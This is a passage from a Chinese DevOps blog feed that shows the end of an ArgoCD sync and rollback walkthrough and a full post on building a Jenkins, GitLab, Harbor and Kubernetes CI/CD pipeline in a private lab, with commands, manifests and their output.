class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@master231 ~]# argocd app get app01<br>Name:               argocd/app01<br>Project:            default<br>Server:             https://kubernetes.default.svc<br>Namespace:          demo1<br>URL:                https://10.0.0.231:30080/applications/app01<br>Source:<br>- Repo:             https://gitee.com/ljh00928/test_cherry.git<br>  Target:           <br>  Path:             app<br>SyncWindow:         Sync Allowed<br>Sync Policy:        Manual<br>Sync Status:        Synced to  (8a1ee3f)<br>Health Status:      Healthy    <span class="hljs-comment">#状态为 Healthy（健康）的了</span><br><br>GROUP  KIND        NAMESPACE  NAME       STATUS  HEALTH   HOOK  MESSAGE<br>       Service     demo1      myapp-svc  Synced  Healthy        service/myapp-svc unchanged<br>apps   Deployment  demo1      myapp      Synced  Healthy        deployment.apps/myapp unchanged<br></code></pre></td></tr></table></figure><p> 然后查看 pod、deploy、svc</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@master231 ~]# kubectl -n demo1 get all<br>NAME                         READY   STATUS    RESTARTS   AGE<br>pod/myapp-6449b755f5-5fkzf   1/1     Running   0          2m26s<br><br>NAME                TYPE       CLUSTER-IP     EXTERNAL-IP   PORT(S)          AGE<br>service/myapp-svc   NodePort   10.200.5.218   &lt;none&gt;        8009:31922/TCP   22m<br><br>NAME                    READY   UP-TO-DATE   AVAILABLE   AGE<br>deployment.apps/myapp   1/1     1            1           22m<br><br>NAME                               DESIRED   CURRENT   READY   AGE<br>replicaset.apps/myapp-5f748b96c    0         0         0       22m<br>replicaset.apps/myapp-6449b755f5   1         1         1       7m18s<br></code></pre></td></tr></table></figure><h3 id="使用-UI-界面同步"><a href="#使用-UI-界面同步" class="headerlink" title="使用 UI 界面同步"></a>使用 UI 界面同步</h3><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/0857ff9730414e6691e334755b9af0b3.png" alt="在这里插入图片描述"></p><p>查看资源状态</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/fc3ce3c2686443b297732806089192d7.png" alt="在这里插入图片描述"></p><p>也可以查看日志、event 等信息</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/332cdfbf3fd5492e951a22bbfc673e86.png" alt="在这里插入图片描述"></p><p>查看 pod、deploy、svc。都运行正常</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@master231 ~]# kubectl -n demo2 get all<br>NAME                         READY   STATUS    RESTARTS   AGE<br>pod/myapp-6449b755f5-4tl7m   1/1     Running   0          7m20s<br><br>NAME                TYPE       CLUSTER-IP      EXTERNAL-IP   PORT(S)          AGE<br>service/myapp-svc   NodePort   10.200.164.64   &lt;none&gt;        8009:31185/TCP   7m20s<br><br>NAME                    READY   UP-TO-DATE   AVAILABLE   AGE<br>deployment.apps/myapp   1/1     1            1           7m20s<br><br>NAME                               DESIRED   CURRENT   READY   AGE<br>replicaset.apps/myapp-6449b755f5   1         1         1       7m20s<br></code></pre></td></tr></table></figure><h2 id="六、更新应用"><a href="#六、更新应用" class="headerlink" title="六、更新应用"></a>六、更新应用</h2><p>上面我们已经部署好了两个应用 app01 和 app02，现在来更改一下 myapp-deployment.yaml 文件，将镜像改为green</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/0278af6638ad4285b655e435b59bb389.png" alt="在这里插入图片描述"></p><p>再次点击sync同步按钮，可以看见有两个rs,一个副本数为 0，一个副本数为 1</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/7fd8c69b053c470a8f0d26f6023913fc.png" alt="在这里插入图片描述"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@master231 ~]# kubectl -n demo2 get rs<br>NAME               DESIRED   CURRENT   READY   AGE<br>myapp-6449b755f5   0         0         0       19m<br>myapp-65c5d9cf87   1         1         1       4m3s<br></code></pre></td></tr></table></figure><h2 id="七、回滚"><a href="#七、回滚" class="headerlink" title="七、回滚"></a>七、回滚</h2><p>上面我们的 app02 已经有两个版本了，现在最新的是 geen版本，我们也可以可以回滚到第一个版本</p><p>现在是这个版本</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/ea8d0b2632244d7ba6a20dde06e58dad.png" alt="在这里插入图片描述"></p><p>在回滚的时候需要禁用 AUTO-SYNC 自动同步，点击历史和回滚。找到要回滚的版本，点击 Rollback</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/b52f3c52db6040829d9a054f990bf1dc.png" alt="在这里插入图片描述"></p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/f27b292e1868437dab42657ce0cef295.png" alt="在这里插入图片描述"></p><p>这时候已经回滚到第一个版本了</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/d86d9c05e6cf4201a764845d0f109750.png" alt="在这里插入图片描述"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#回滚前</span><br>[root@master231 ~]# kubectl -n demo2 get rs<br>NAME               DESIRED   CURRENT   READY   AGE<br>myapp-6449b755f5   0         0         0       32m<br>myapp-65c5d9cf87   1         1         1       16m<br><br><span class="hljs-comment">#回滚后</span><br>[root@master231 ~]# kubectl -n demo2 get rs<br>NAME               DESIRED   CURRENT   READY   AGE<br>myapp-6449b755f5   1         1         1       35m<br>myapp-65c5d9cf87   0         0         0       19m<br></code></pre></td></tr></table></figure><p>查看 pod，svc，deployment</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@master231 ~]# kubectl -n demo2 get all<br>NAME                         READY   STATUS    RESTARTS   AGE<br>pod/myapp-6449b755f5-252l9   1/1     Running   0          3m10s<br><br>NAME                TYPE       CLUSTER-IP      EXTERNAL-IP   PORT(S)          AGE<br>service/myapp-svc   NodePort   10.200.164.64   &lt;none&gt;        8009:31185/TCP   36m<br><br>NAME                    READY   UP-TO-DATE   AVAILABLE   AGE<br>deployment.apps/myapp   1/1     1            1           36m<br><br>NAME                               DESIRED   CURRENT   READY   AGE<br>replicaset.apps/myapp-6449b755f5   1         1         1       36m<br>replicaset.apps/myapp-65c5d9cf87   0         0         0       20m<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CICD</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CICD</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>jenkins+gitlab+docker+harbor+k8s终结篇</title>
    <link href="/2025/04/18/jenkins-gitlab-docker-harbor-k8s%E7%BB%88%E7%BB%93%E7%AF%87/"/>
    <url>/2025/04/18/jenkins-gitlab-docker-harbor-k8s%E7%BB%88%E7%BB%93%E7%AF%87/</url>
    
    <content type="html"><![CDATA[<p> 之前我们已经把相关环境，持续集成这一块都实现了。详细内容可查看我cicd专栏前三篇的内容。</p><p><a href="https://blog.csdn.net/m0_69326428/article/details/144375315">kubeadm 部署k8s-CSDN博客</a></p><p> <a href="https://blog.csdn.net/m0_69326428/article/details/144376600">harbor部署-CSDN博客</a></p><p><a href="https://blog.csdn.net/m0_69326428/article/details/144470530">Jenkins+gitlab持续集成_gitlab jenkins 集成-CSDN博客</a></p><p>本篇内容主要是讲解持续集成和持续交付是如何实现和部署的。</p><p><strong>概念</strong></p><p>持续交付建立在持续集成的基础上，通过自动化的流程确保软件可以随时随地进行部署。</p><p><strong>流程</strong><br> 这时，持续交付后的代码已经在主分支上了，这处于某个版本的待发布的状态，随时可以将开发环境的功能部署到生产环境中（部署到生成环境前还需要在测试环境性能测试、回归测试、自动化测试、人工测试等），运行脚本构建打包应用，通过自动化部署工具部署到生产环境运行应用，监控生产环境指标，如出现问题和错误，可以触发手动或自动回滚，如系统正常，则定期回顾，收集反馈，优化，并持续改进</p><p><strong>流程图</strong></p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/33e75aa499d6441e9e997bd210cff040.png" alt="img"></p><p><strong>机器规划如下</strong></p><table><thead><tr><th>设备名称</th><th>ip地址</th><th>配置</th></tr></thead><tbody><tr><td>master231</td><td>10.0.0.231</td><td>2核，4GiB，系统盘 20GiB</td></tr><tr><td>worken232</td><td>10.0.0.232</td><td>2核，4GiB，系统盘 20GiB</td></tr><tr><td>worken233</td><td>10.0.0.233</td><td>2核，4GiB，系统盘 20GiB</td></tr><tr><td>jenkins211</td><td>10.0.0.211</td><td>2核，4GiB，系统盘 20GiB</td></tr><tr><td>gitlab212</td><td>10.0.0.212</td><td>4核，4GiB，系统盘 20GiB</td></tr><tr><td>harbor</td><td>10.0.0.250</td><td>2核，4GiB，系统盘 20GiB</td></tr></tbody></table><h2 id="一、编写dockerfile"><a href="#一、编写dockerfile" class="headerlink" title="一、编写dockerfile"></a>一、编写dockerfile</h2><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs gradle">[root@gitlab212 <span class="hljs-keyword">project</span>]# pwd<br><span class="hljs-regexp">/root/</span><span class="hljs-keyword">project</span><br><br>[root@gitlab212 <span class="hljs-keyword">project</span>]# vim Dockerfile <br><span class="hljs-keyword">FROM</span> registry.cn-hangzhou.aliyuncs.com<span class="hljs-regexp">/yinzhengjie-k8s/</span>apps:v1<br><br>EXPOSE <span class="hljs-number">80</span><br><br>WORKDIR <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/nginx/</span>html/<br><br>ADD . <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/nginx/</span>html/<br></code></pre></td></tr></table></figure><p>本地打镜像测试</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">[root@gitlab212 <span class="hljs-keyword">project</span>]<span class="hljs-comment"># docker image build -t yiliao:v1 .</span><br></code></pre></td></tr></table></figure><p>运行镜像</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@gitlab212</span> project]<span class="hljs-meta"># docker run -d -p 88:80  yiliao:v1</span><br></code></pre></td></tr></table></figure><p>访问</p><blockquote><p><a href="http://10.0.0.212:88/">http://10.0.0.212:88/</a></p></blockquote><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/55dcdcf431a14bbd9bd889ff73a342ff.png" alt="img"></p><h2 id="二、集成harbor"><a href="#二、集成harbor" class="headerlink" title="二、集成harbor"></a>二、集成harbor</h2><p>1.启动harbor仓库</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@harbor</span>.oldboyedu.com harbor]<span class="hljs-meta"># docker-compose down -t 0</span><br>[root<span class="hljs-symbol">@harbor</span>.oldboyedu.com harbor]<span class="hljs-meta"># docker-compose up -d</span><br></code></pre></td></tr></table></figure><p>2.harbor新建仓库</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/675b129dd52e4148a2b55c4137344aee.png" alt="img"></p><p> 3.jenkins编写shell</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">docker login -u admin -<span class="hljs-selector-tag">p</span> <span class="hljs-number">1</span> harbor<span class="hljs-selector-class">.cherry</span><span class="hljs-selector-class">.com</span><br>docker <span class="hljs-selector-tag">image</span> build -t harbor<span class="hljs-selector-class">.cherry</span>.com/yiliao/yiliao:v1 .<br>docker push harbor<span class="hljs-selector-class">.cherry</span>.com/yiliao/yiliao:v1<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/551110df74e84b5396f6dbe650f56e0c.png" alt="img"></p><p> 4.推送故障排查</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/6a30c2a630dd403fb81d770862faf5fa.png" alt="img"></p><p>没有docker命令，只需要在jenkins上安装docker </p><p>jenkins上做harbor的hosts解析</p><blockquote><p>[root@jenkins211 ~]# echo 10.0.0.250 harbor.cherry.com &gt;&gt;&#x2F;etc&#x2F;hosts</p></blockquote><p> x509证书问题</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/553aa352eb7549d5bcb57541d7ef717f.png" alt="img"></p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs tap">创建harbor客户端证书存放目录<br>[root@jenkins211 ~]<span class="hljs-comment"># mkdir -pv /etc/docker/certs.d/harbor.cherry.com</span><br><br>harbor上需要准备客户端证书<br>[root@harbor certs]<span class="hljs-comment"># ll</span><br>total 20<br>drwxr-xr-x<span class="hljs-number"> 5 </span>root root<span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 10 </span>08:26 ./<br>drwxr-xr-x<span class="hljs-number"> 4 </span>root root<span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 10 </span>08:45 ../<br>drwxr-xr-x<span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 10 </span>08:31 ca/<br>drwxr-xr-x<span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 18 </span>05:55 docker-client/<br>drwxr-xr-x<span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 10 </span>08:32 harbor-server/<br><br>[root@harbor.oldboyedu.com certs]<span class="hljs-comment"># openssl x509 -inform PEM -in harbor-server/harbor.cherry.com.crt -out docker-client/harbor.cherry.com.cert</span><br><span class="hljs-comment">#查看证书一致性</span><br>[root@harbor.oldboyedu.com certs]<span class="hljs-comment"># md5sum docker-client/harbor.cherry.com.cert harbor-server/harbor.cherry.com.crt</span><br>cp harbor-server/harbor.cherry.key /docker-client/<br>cp ca/ca.crt docker-client/<br><br>[root@harbor certs]<span class="hljs-comment"># cd docker-client/</span><br>[root@harbor docker-client]<span class="hljs-comment"># ll</span><br>total 20<br>drwxr-xr-x<span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 18 </span>05:55 ./<br>drwxr-xr-x<span class="hljs-number"> 5 </span>root root<span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 10 </span>08:26 ../<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 2041 </span>Dec<span class="hljs-number"> 18 </span>05:55 ca.crt<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 2134 </span>Dec<span class="hljs-number"> 18 </span>05:38 harbor.cherry.com.cert<br>-rw-------<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 3272 </span>Dec<span class="hljs-number"> 18 </span>05:54 harbor.cherry.com.key<br><br><span class="hljs-comment">#拷贝证书到jenkins</span><br>[root@jenkins211 ~]<span class="hljs-comment"># scp harbor.cherry.com:/softwares/harbor/certs/docker-client/* /etc/docker/certs.d/harbor.cherry.com</span><br>[root@jenkins211 ~]<span class="hljs-comment"># ll /etc/docker/certs.d/harbor.cherry.com</span><br></code></pre></td></tr></table></figure><p>登录harbor仓库</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">[root@jenkins211 harbor.cherry.com]# docker <span class="hljs-keyword">login</span> -u <span class="hljs-keyword">admin</span> -p <span class="hljs-number">1</span> harbor.cherry.com<br><span class="hljs-built_in">WARNING</span>! <span class="hljs-keyword">Using</span> <span class="hljs-comment">--password via the CLI is insecure. Use --password-stdin.</span><br><span class="hljs-built_in">WARNING</span>! Your <span class="hljs-keyword">password</span> will be stored <span class="hljs-keyword">unencrypted</span> <span class="hljs-keyword">in</span> /root/.docker/config.json.<br>Configure a credential helper <span class="hljs-keyword">to</span> remove this <span class="hljs-built_in">warning</span>. See<br>https://docs.docker.com/engine/reference/commandline/<span class="hljs-keyword">login</span>/#credentials-store<br><br><span class="hljs-keyword">Login</span> Succeeded<br></code></pre></td></tr></table></figure><p> 5.harbor仓库查看镜像</p><p>这时候镜像已经推送到harbor仓库了</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/f796bdb8b1474bdd97dc40f3b178bc60.png" alt="img"></p><h2 id="三、jenkins一键更新k8s项目"><a href="#三、jenkins一键更新k8s项目" class="headerlink" title="三、jenkins一键更新k8s项目"></a>三、jenkins一键更新k8s项目</h2><p>1.新建yiliao名称空间</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs dts">[root@master231 <span class="hljs-number">01</span>-yiliao]<span class="hljs-meta"># cat 01-ns-yiliao.yaml </span><br><span class="hljs-symbol">apiVersion:</span> v1<br><span class="hljs-symbol">kind:</span> Namespace<br><span class="hljs-symbol">metadata:</span><br><span class="hljs-symbol">  labels:</span><br><span class="hljs-symbol">    school:</span> cherry<br><span class="hljs-symbol">    class:</span> cherry<br><span class="hljs-symbol">  name:</span> yiliao<br></code></pre></td></tr></table></figure><p>2.使用deploy控制器编写资源清单</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs nix">[root@master231 <span class="hljs-number">0</span>1-yiliao]<span class="hljs-comment"># cat 02-deploy-yiliao.yaml </span><br><span class="hljs-params">apiVersion:</span> apps<span class="hljs-symbol">/v1</span><br><span class="hljs-params">kind:</span> Deployment<br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> deploy-yiliao<br>  <span class="hljs-params">namespace:</span> yiliao<br><span class="hljs-params">spec:</span><br>  <span class="hljs-params">replicas:</span> <span class="hljs-number">3</span><br>  <span class="hljs-params">selector:</span><br>    <span class="hljs-params">matchLabels:</span><br>      <span class="hljs-params">apps:</span> yiliao<br>  <span class="hljs-params">template:</span><br>    <span class="hljs-params">metadata:</span><br>      <span class="hljs-params">labels:</span><br>        <span class="hljs-params">apps:</span> yiliao<br>    <span class="hljs-params">spec:</span><br>       <span class="hljs-params">containers:</span><br>       <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> yiliao<br>         <span class="hljs-params">image:</span> harbor.cherry.com<span class="hljs-operator">/</span>yiliao<span class="hljs-operator">/</span>yiliao:v1<br></code></pre></td></tr></table></figure><p>3.编写svc</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs nix">[root@master231 <span class="hljs-number">0</span>1-yiliao]<span class="hljs-comment"># cat 03-svc-yiliao.yaml </span><br><span class="hljs-params">apiVersion:</span> v1<br><span class="hljs-params">kind:</span> Service<br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> yiliao-svc<br>  <span class="hljs-params">namespace:</span> yiliao<br><span class="hljs-params">spec:</span><br>  <span class="hljs-params">type:</span> NodePort<br>  <span class="hljs-params">selector:</span><br>    <span class="hljs-params">apps:</span> yiliao<br>  <span class="hljs-params">ports:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">port:</span> <span class="hljs-number">80</span><br>    <span class="hljs-params">targetPort:</span> <span class="hljs-number">80</span><br>    <span class="hljs-params">nodePort:</span> <span class="hljs-number">30080</span><br></code></pre></td></tr></table></figure><p>4.部署</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-meta">#创建资源</span><br>[root<span class="hljs-symbol">@master231</span> <span class="hljs-number">01</span>-yiliao]<span class="hljs-meta"># kubectl apply -f .</span><br><br><span class="hljs-meta">#指定名称空间查看</span><br>[root<span class="hljs-symbol">@master231</span> <span class="hljs-number">01</span>-yiliao]<span class="hljs-meta"># kubectl get svc,po -n yiliao </span><br></code></pre></td></tr></table></figure><p>5.创建secret</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">kubectl create<span class="hljs-built_in"> secret </span>docker-registry harbor-secret \<br>  <span class="hljs-attribute">--docker-server</span>=harbor.cherry.com \<br>  <span class="hljs-attribute">--docker-username</span>=admin \<br>  <span class="hljs-attribute">--docker-password</span>=1 \<br>  <span class="hljs-attribute">--namespace</span>=yiliao<br></code></pre></td></tr></table></figure><p>创建工作负载</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs tap">[root@master231 yiliao]<span class="hljs-comment"># ll</span><br>total 20<br>drwxr-xr-x <span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 18 </span>15:30 ./<br>drwx------<span class="hljs-number"> 10 </span>root root<span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 18 </span>15:30 ../<br>-rw-r--r-- <span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 103 </span>Dec<span class="hljs-number"> 18 </span>14:44 01-ns-yiliao.yaml<br>-rw-r--r-- <span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 378 </span>Dec<span class="hljs-number"> 18 </span>15:20 02-deploy-yiliao.yaml<br>-rw-r--r-- <span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 191 </span>Dec<span class="hljs-number"> 18 </span>15:30 03-svc-yiliao.yaml<br><br><br>[root@master231 yiliao]<span class="hljs-comment"># kubectl apply -f .</span><br>namespace/yiliao created<br>deployment.apps/deploy-yiliao created<br>service/yiliao-svc created<br><br><br>//所有节点都需要harbor客户端证书，不然镜像拉取会失败<br></code></pre></td></tr></table></figure><p>5.访问</p><blockquote><p><a href="http://10.0.0.232:30080/">http://10.0.0.232:30080/</a></p></blockquote><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/68d16e255d0c43fea5ef537a6c352659.png" alt="img"></p><h2 id="四、更新项目"><a href="#四、更新项目" class="headerlink" title="四、更新项目"></a>四、更新项目</h2><p>1.jenkins安装kubectl工具</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">我本地已经下载了，这里就直接上传到<span class="hljs-keyword">jenkins中</span><br><span class="hljs-keyword"></span><br><span class="hljs-comment">#将kubectl放到PATH环境变量</span><br>[root@<span class="hljs-keyword">jenkins211 </span>~]<span class="hljs-comment"># mv kubectl-1.23.17 /usr/local/sbin/kubectl</span><br>[root@<span class="hljs-keyword">jenkins211 </span>~]<span class="hljs-comment"># chmod +x /usr/local/sbin/kubectl</span><br></code></pre></td></tr></table></figure><p>2.pod创建的时候会携带https证书，所以我们需要拷贝231节点证书到jenkins</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@jenkins211</span> ~]<span class="hljs-meta"># mkdir -pv ~/.kube/</span><br>[root<span class="hljs-symbol">@jenkins211</span> ~]<span class="hljs-meta"># scp 10.0.0.231:/root/.kube/config ~/.kube/</span><br></code></pre></td></tr></table></figure><p>3.gitlab修改项目</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/4fcf891879064c54b24f90c429963041.png" alt="img"></p><p>4.jenkins构建项目，测试</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">docker login -u admin -<span class="hljs-selector-tag">p</span> <span class="hljs-number">1</span> harbor<span class="hljs-selector-class">.cherry</span><span class="hljs-selector-class">.com</span><br>docker <span class="hljs-selector-tag">image</span> build -t harbor<span class="hljs-selector-class">.cherry</span>.com/yiliao/yiliao:v3 .<br>docker push harbor<span class="hljs-selector-class">.cherry</span>.com/yiliao/yiliao:v3<br>kubectl -n yiliao set <span class="hljs-selector-tag">image</span> deploy deploy-yiliao yiliao=harbor<span class="hljs-selector-class">.cherry</span>.com/yiliao/yiliao:v3<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/b853e828b3de476ebaa60355be6fbbbc.png" alt="img"></p><p> 查看harbor仓库，我们打的镜像都成功推上来了</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/7fbd2f4bfc4e4fafb2ce1730ba04eac2.png" alt="img"></p><p> 访问</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/035923010dab43f89a143957b3f4ade4.png" alt="img"></p><h2 id="五、自动构建"><a href="#五、自动构建" class="headerlink" title="五、自动构建"></a>五、自动构建</h2><p>我们每次都需要手动更改jenkins版本号，这是件麻烦的事，我们可以选择git参数构建的方式，这样就不需要手动更改版本号</p><p>1.git参数填写</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/24c425ebcfe0448da204dd89c10d5d52.png" alt="img"></p><p> 2.修改jenkins中shell脚本</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">docker login -u admin -<span class="hljs-selector-tag">p</span> <span class="hljs-number">1</span> harbor<span class="hljs-selector-class">.cherry</span><span class="hljs-selector-class">.com</span><br>docker <span class="hljs-selector-tag">image</span> build -t harbor<span class="hljs-selector-class">.cherry</span>.com/yiliao/yiliao:<span class="hljs-variable">$release</span> .<br>docker push harbor<span class="hljs-selector-class">.cherry</span>.com/yiliao/yiliao:<span class="hljs-variable">$release</span><br>kubectl -n yiliao set <span class="hljs-selector-tag">image</span> deploy deploy-yiliao yiliao=harbor<span class="hljs-selector-class">.cherry</span>.com/yiliao/yiliao:<span class="hljs-variable">$release</span><br></code></pre></td></tr></table></figure><p>4.jenkins选择版本构建</p><p>5.harbor仓库查看最新镜像</p>]]></content>
